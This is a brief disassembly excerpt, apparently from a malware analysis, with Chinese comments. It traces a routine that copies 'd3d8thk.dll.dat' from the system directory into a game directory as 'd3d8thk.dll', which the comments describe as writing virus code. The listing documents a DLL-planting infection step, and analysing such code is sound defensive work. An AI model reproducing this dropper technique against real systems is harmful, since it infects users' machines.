004034F8  |.  50                    push    eax                                   ;  游戏目录
004034F9  |.  56                    push    esi                                   ;  "d3d8thk.dll"
004034FA  |.  E8 E61B0000           call    004050E5                              ;  复制"系统目录\\d3d8thk.dll.dat" 到 "游戏目录\\d3d8thk.dll"
004034FF  |.  0FB6C0                movzx   eax, al                             ;  1
00403502  |.  83C4 0C               add     esp, 0C
00403505  |.  3BC3                  cmp     eax, ebx
00403507  |.  75 07                 jnz     short 00403510                        ;  成功写入病毒代码，则跳转
00403509  |>  56                    push    esi                                   ;  "d3d8thk.dll"
0040350A  |.  E8 38160000           call    00404B47
0040350F  |.  59                    pop     ecx
00403510  |>  6A 01                 push    1
00403512  |.  58                    pop     eax
00403513  |>  5F                    pop     edi
00403514  |.  5E                    pop     esi
00403515  |.  5B                    pop     ebx
00403516  |.  C9                    leave
00403517  \\. C3                    ret
```
